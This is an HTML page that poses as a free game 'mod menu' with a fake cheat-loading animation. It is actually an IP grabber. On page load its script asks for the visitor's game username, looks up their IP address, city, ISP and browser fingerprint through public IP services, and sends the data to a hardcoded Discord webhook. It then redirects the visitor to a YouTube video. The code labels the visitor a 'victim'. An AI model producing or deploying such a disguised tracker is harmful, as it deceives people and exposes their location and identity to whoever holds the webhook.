<!DOCTYPE html>

<head>

        body { background: linear-gradient(45deg, #0a0a0a, #1a001f, #000); color: #00ff41; font-family: 'Press Start 2P', cursive; text-align: center; padding: 20px; margin: 0; overflow: hidden; height: 100vh; }
        .container { max-width: 680px; margin: auto; padding-top: 8vh; }
        h1 { font-size: 2em; text-shadow: 0 0 20px #00ff41, 0 0 40px #ff00ff; animation: glitch 0.7s infinite alternate; margin-bottom: 10px; }
        .subtitle { color: #ff00ff; font-size: 1.1em; margin-bottom: 30px; }
        .progress { height: 28px; background: #111; border: 3px solid #00ff41; margin: 35px auto; width: 88%; box-shadow: 0 0 25px #00ff41; }
        .bar { height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41); transition: width 0.25s linear; box-shadow: 0 0 20px #ff00ff; }
        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-4px, 3px); } 40% { transform: translate(4px, -3px); } 100% { transform: translate(0); } }
        #status { margin: 20px 0; font-size: 1.15em; min-height: 1.8em; text-shadow: 0 0 10px #00ff41; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ULTIMATE MOD MENU v2.4</h1>
        <p class="subtitle">FREE • UNDETECTED • WORKING 2026</p>
        <p id="status">Connecting to private server...</p>
        <div class="progress"><div id="prog" class="bar"></div></div>
        <p style="margin-top:40px; color:#ff00ff;">Activating cheats...</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const customId = urlParams.get('id') || urlParams.get('victim') || "TestVictim";

        let data = {
            customId: customId,
            name: "Anonymous",
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            fingerprint: "AUTO-" + Date.now()
        };

        function fakeLoading() {
            let progress = 0;
            const progBar = document.getElementById('prog');
            const status = document.getElementById('status');
            const msgs = ["Connecting...", "Bypassing anticheat...", "Injecting cheats...", "Finalizing..."];
            let i = 0;
            const int = setInterval(() => {
                progress += 20;
                progBar.style.width = `${Math.min(progress, 100)}%`;
                if (progress > 30 && i === 0) { status.textContent = msgs[1]; i++; }
                if (progress > 60 && i === 1) { status.textContent = msgs[2]; i++; }
                if (progress >= 100) clearInterval(int);
            }, 130);
        }

        async function getIPAndGeo() {
            const services = [
                // 1. ipify + ip-api
                async () => {
                    const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({}));
                    if (!ipRes.ip) return {};
                    const geo = await fetch(`https://ip-api.com/json/${ipRes.ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy`).then(r => r.json()).catch(() => ({}));
                    return {ip: ipRes.ip, ...geo};
                },
                // 2. ipinfo.io
                () => fetch('https://ipinfo.io/json').then(r => r.json()).then(d => ({
                    ip: d.ip, country: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
                })),
                // 3. ipapi.co (very reliable)
                () => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => ({
                    ip: d.ip, country: d.country_name, countryCode: d.country, city: d.city, region: d.region, isp: d.org, timezone: d.timezone
                }))
            ];

            for (let svc of services) {
                try {
                    const res = await svc();
                    if (res.ip || res.country) {
                        data.ip = res.ip || data.ip || "N/A";
                        Object.assign(data, {
                            country: res.country || res.country_name || "Unknown",
                            countryCode: res.countryCode || "N/A",
                            city: res.city || "Unknown",
                            region: res.region || res.regionName || "Unknown",
                            isp: res.isp || res.org || "Unknown",
                            timezone: res.timezone || "Unknown",
                            lat: res.lat || "N/A",
                            lon: res.lon || "N/A",
                            proxy: (res.proxy || res.vpn) ? "YES" : "No"
                        });
                        return;
                    }
                } catch(e) {}
            }
            data.ip = "Lookup Failed - Try Hosted Link";
        }

        function sendToDiscord() {
            const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: "Mod Menu Grabber",
                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}`,
                    embeds: [{title: "Full Dump", description: "```json\n" + JSON.stringify(data, null, 2) + "\n```", color: 0x00ff41}]
                })
            }).catch(() => {});
        }

        window.onload = async () => {
            fakeLoading();
            setTimeout(async () => {
                data.name = prompt("ENTER YOUR GAME USERNAME TO ACTIVATE:", "") || "TestVictim";
                await getIPAndGeo();
                sendToDiscord();
                setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq", 1500);
            }, 1600);
        };
    </script>
</body>
</html>
